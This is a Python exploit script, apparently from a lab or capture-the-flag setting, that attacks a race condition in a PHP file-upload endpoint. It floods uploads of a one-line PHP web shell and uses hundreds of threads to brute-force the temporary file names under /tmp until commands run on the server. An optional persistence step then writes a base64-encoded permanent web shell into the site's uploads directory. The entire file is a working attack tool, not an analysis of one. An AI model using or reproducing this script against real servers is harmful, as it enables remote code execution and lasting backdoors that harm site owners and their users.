import requests
import argparse
import base64
import random
import string
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote
from functools import partial

WEB_SHELL = "<?php system($_GET[0]); ?>"

def make_session(pool_size: int = 1000, timeout: float = 1.0) -> requests.Session:
    s = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=pool_size, pool_maxsize=pool_size, max_retries=0
    )
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.headers.update({"User-Agent": "yara-race-exploit/1.0"})
    s.request = partial(s.request, timeout=timeout)
    return s

def upload_loop(session: requests.Session, upload_url: str, php_code: str, interval: float, stop_evt: threading.Event, field_name: str = "file"):
    files = {field_name: ("shell.php", php_code.encode("utf-8"), "application/x-php")}
    i = 0
    while not stop_evt.is_set():
        try:
            r = session.post(upload_url, files=files, allow_redirects=True)
            if i % 25 == 0:
                sys.stdout.write(f"[upload] status={r.status_code}\n")
                sys.stdout.flush()
        except Exception as e:
            if i % 25 == 0:
                sys.stdout.write(f"[upload] error: {e}\n")
                sys.stdout.flush()
        i += 1
        if interval > 0:
            time.sleep(interval)

def probe_one(session: requests.Session, base: str, tmp_path: str, num: str, cmd: str):
    url = f"{base.rstrip('/')}{tmp_path}/{num}.php?0={quote(cmd, safe='')}"
    try:
        r = session.get(url)
        if r.status_code == 200 or "uid=" in r.text or "uid =" in r.text:
            return url, r.text
    except Exception:
        pass
    return None

def bruteforce(session: requests.Session, base: str, tmp_path: str, cmd: str, threads: int, stop_evt: threading.Event):
    numbers = [f"{i:04d}" for i in range(10000)]
    while not stop_evt.is_set():
        random.shuffle(numbers)
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(probe_one, session, base, tmp_path, n, cmd): n for n in numbers}
            for fut in as_completed(futures):
                if stop_evt.is_set():
                    break
                try:
                    res = fut.result()
                except Exception:
                    continue
                if res:
                    url, text = res
                    print(f"\n[FOUND NUMBER] {url}\n{text}\n")
                    stop_evt.set()
                    return url, text
    return None, None

def upload_shell(session: requests.Session, hit_url: str, base: str, php_code: str, payload_path: str = "/var/www/html/uploads/shell.php"):
    try:
        b64 = base64.b64encode(php_code.encode()).decode()
        php_cmd = f"php -r 'file_put_contents(\"{payload_path}\", base64_decode(\"{b64}\"));'"
        session.get(f"{hit_url}&stage=persist", params={}, allow_redirects=False)
        r = session.get(f"{hit_url.split('?')[0]}?0={quote(php_cmd, safe='')}")
        print(f"[persist] Write Shell To {payload_path}, HTTP {r.status_code}")
        test = session.get(f"{base.rstrip('/')}/uploads/{payload_path.split('/')[-1]}?0=id")
        if test.status_code == 200:
            print(f"[persist] OK: {test.text}")
        else:
            print(f"[persist] test HTTP {test.status_code}")
    except Exception as e:
        print(f"[persist] error: {e}")

def main():
    ap = argparse.ArgumentParser(description="Exploit Race Condition In Upload WebShell.")
    ap.add_argument("--base", required=True, help="Base URL, http://TARGET")
    ap.add_argument("--upload", default="/upload.php", help="Upload path")
    ap.add_argument("--tmp", default="/tmp", help="Temp web path where files appear ")
    ap.add_argument("--cmd", default="id", help="Command to execute via ?0=")
    ap.add_argument("--threads", type=int, default=300, help="Concurrent GET workers over /tmp/0000..9999")
    ap.add_argument("--upload-interval", type=float, default=0.0, help="Sleep seconds between uploads (default: 0)")
    ap.add_argument("--field-name", default="file", help="Form field name for upload (default: file)")
    ap.add_argument("--persist", action="store_true", help="After first HIT, drop persistent /uploads/p.php")
    ap.add_argument("--timeout", type=float, default=0.8, help="HTTP timeout seconds")
    ap.add_argument("--php", default=WEB_SHELL, help="PHP webshell content (default: system($_GET[0]))")
    args = ap.parse_args()

    session = make_session(pool_size=max(64, args.threads * 2), timeout=args.timeout)
    upload_url = f"{args.base.rstrip('/')}{args.upload}"
    tmp_path = args.tmp if args.tmp.startswith("/") else "/" + args.tmp

    stop_evt = threading.Event()
    up_thr = threading.Thread(target=upload_loop, args=(session, upload_url, args.php, args.upload_interval, stop_evt, args.field_name), daemon=True)
    up_thr.start()

    print(f"[i] Brutefore {args.base.rstrip('/')}{tmp_path}/[0000-9999].php while uploading webshell")
    print(f"[i] Threads={args.threads}, timeout={args.timeout}s, upload interval={args.upload_interval}s")
    print(f"[i] Press Ctrl+C To Stop.\n")
    try:
        hit_url, text = bruteforce(session, args.base, tmp_path, args.cmd, args.threads, stop_evt)
        if hit_url:
            print(f"[+] RCE Success At: {hit_url}")
            if args.persist:
                upload_shell(session, hit_url, args.base, args.php)
        else:
            print("[-] No found number.")
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    finally:
        stop_evt.set()

if __name__ == "__main__":
    main()
